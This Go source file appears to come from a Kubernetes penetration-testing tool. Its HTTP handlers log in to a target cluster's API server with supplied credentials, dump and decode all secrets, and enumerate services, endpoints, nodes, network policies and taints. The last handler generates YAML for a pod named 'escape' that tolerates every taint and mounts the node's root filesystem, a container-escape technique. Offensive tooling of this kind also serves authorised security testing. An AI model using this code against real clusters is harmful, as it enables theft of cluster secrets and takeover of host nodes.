package handler

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type LateralHandler struct{}

func NewLateralHandler() *LateralHandler { return &LateralHandler{} }

func (h *LateralHandler) buildClient(c *gin.Context) (*kubectl.Client, error) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		return nil, err
	}
	server := "https://" + req.TargetHost + ":6443"
	if req.Token != "" {
		return kubectl.NewClient(server, req.Token, req.SkipTLS)
	}
	return kubectl.NewClientWithUserPass(server, req.Username, req.Password, req.SkipTLS)
}

func (h *LateralHandler) ListSecrets(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return
	}
	server := "https://" + req.TargetHost + ":6443"
	client, err := kubectl.NewClientWithUserPass(server, req.Username, req.Password, req.SkipTLS)
	if req.Token != "" { client, err = kubectl.NewClient(server, req.Token, req.SkipTLS) }
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	if req.TimeoutSec == 0 { req.TimeoutSec = 10 }
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()
	list, err := client.ListSecrets(ctx, req.Namespace)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	secrets := make([]gin.H, 0, len(list.Items))
	for _, s := range list.Items {
		decoded := make(map[string]string)
		for k, v := range s.Data { decoded[k] = string(v) }
		secrets = append(secrets, gin.H{
			"namespace": s.Namespace, "name": s.Name, "type": string(s.Type),
			"keys": len(s.Data), "decoded_keys": decoded,
		})
	}
	c.JSON(http.StatusOK, gin.H{"secrets": secrets, "total": len(secrets)})
}

func (h *LateralHandler) ViewSecret(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace" binding:"required"`
		SecretName string `json:"secret_name" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return
	}
	server := "https://" + req.TargetHost + ":6443"
	client, err := kubectl.NewClientWithUserPass(server, req.Username, req.Password, req.SkipTLS)
	if req.Token != "" { client, err = kubectl.NewClient(server, req.Token, req.SkipTLS) }
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	if req.TimeoutSec == 0 { req.TimeoutSec = 10 }
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()
	sec, err := client.GetSecret(ctx, req.Namespace, req.SecretName)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	decoded := make(map[string]string)
	for k, v := range sec.Data { decoded[k] = string(v) }
	c.JSON(http.StatusOK, gin.H{"namespace": sec.Namespace, "name": sec.Name, "type": string(sec.Type), "decoded_data": decoded})
}


func (h *LateralHandler) ListServices(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	svcList, err := client.ListServices(ctx, "")
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	svcs := make([]gin.H, 0, len(svcList.Items))
	for _, s := range svcList.Items {
		ports := make([]string, 0)
		for _, p := range s.Spec.Ports {
			ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
		}
		svcs = append(svcs, gin.H{
			"namespace": s.Namespace, "name": s.Name, "type": string(s.Spec.Type),
			"cluster_ip": s.Spec.ClusterIP, "ports": ports,
		})
	}
	c.JSON(http.StatusOK, gin.H{"services": svcs, "total": len(svcs)})
}

func (h *LateralHandler) ListEndpoints(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	epList, err := client.ListEndpoints(ctx, "")
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	eps := make([]gin.H, 0, len(epList.Items))
	for _, ep := range epList.Items {
		addrs := make([]string, 0)
		for _, subset := range ep.Subsets {
			for _, addr := range subset.Addresses {
				addrs = append(addrs, addr.IP)
			}
		}
		eps = append(eps, gin.H{"namespace": ep.Namespace, "name": ep.Name, "addresses": addrs})
	}
	c.JSON(http.StatusOK, gin.H{"endpoints": eps, "total": len(eps)})
}

func (h *LateralHandler) ListNodes(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	nodeList, err := client.ListNodes(ctx)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	nodes := make([]gin.H, 0, len(nodeList.Items))
	for _, n := range nodeList.Items {
		ip := ""
		for _, a := range n.Status.Addresses {
			if a.Type == corev1.NodeInternalIP {
				ip = a.Address
			}
		}
		nodes = append(nodes, gin.H{
			"name": n.Name, "status": getNodeReady(&n), "ip": ip,
			"os": n.Status.NodeInfo.OSImage, "kernel": n.Status.NodeInfo.KernelVersion,
			"runtime": n.Status.NodeInfo.ContainerRuntimeVersion, "version": n.Status.NodeInfo.KubeletVersion,
		})
	}
	c.JSON(http.StatusOK, gin.H{"nodes": nodes, "total": len(nodes)})
}

func (h *LateralHandler) ListNetworkPolicies(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	npList, err := client.Clientset.NetworkingV1().NetworkPolicies("").List(ctx, metav1.ListOptions{})
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	nps := make([]gin.H, 0, len(npList.Items))
	for _, np := range npList.Items {
		nps = append(nps, gin.H{
			"namespace": np.Namespace, "name": np.Name,
			"pod_selector": np.Spec.PodSelector.MatchLabels,
			"policy_types": np.Spec.PolicyTypes,
		})
	}
	c.JSON(http.StatusOK, gin.H{"network_policies": nps, "total": len(nps)})
}

func (h *LateralHandler) ShowTaints(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	nodeList, err := client.ListNodes(ctx)
	if err != nil { c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return }
	type taintInfo struct {
		Node   string `json:"node"`
		Taints []corev1.Taint `json:"taints"`
	}
	taints := make([]taintInfo, 0)
	for _, n := range nodeList.Items {
		if len(n.Spec.Taints) > 0 {
			taints = append(taints, taintInfo{Node: n.Name, Taints: n.Spec.Taints})
		}
	}
	c.JSON(http.StatusOK, gin.H{"taints": taints, "total": len(taints)})
}

func (h *LateralHandler) GenerateTaintPod(c *gin.Context) {
	var req struct {
		NodeName  string `json:"node_name"`
		Image     string `json:"image"`
		HostMount bool   `json:"host_mount"`
	}
	if err := c.ShouldBindJSON(&req); err != nil { c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return }
	if req.Image == "" { req.Image = "alpine:3.20" }
	vm, vol := "", ""
	if req.HostMount {
		vm = "    volumeMounts:\n    - name: host-root\n      mountPath: /host\n"
		vol = "  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n"
	}
	// 节点名可选：留空时生成可在任意节点调度的污点容忍 Pod
	nodeSelector := ""
	podName := "taint-pod"
	if req.NodeName != "" {
		nodeSelector = fmt.Sprintf("  nodeName: %s\n", req.NodeName)
		// 用节点名前 8 字符做 pod 名后缀，先判空避免越界
		suffix := req.NodeName
		if len(suffix) > 8 {
			suffix = suffix[:8]
		}
		podName = "taint-pod-" + suffix
	}
	yaml := fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  name: %s
spec:
%s  tolerations:
  - operator: "Exists"
  containers:
  - name: escape
    image: %s
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
%s%s`, podName, nodeSelector, req.Image, vm, vol)
	c.JSON(http.StatusOK, gin.H{"yaml": yaml})
}

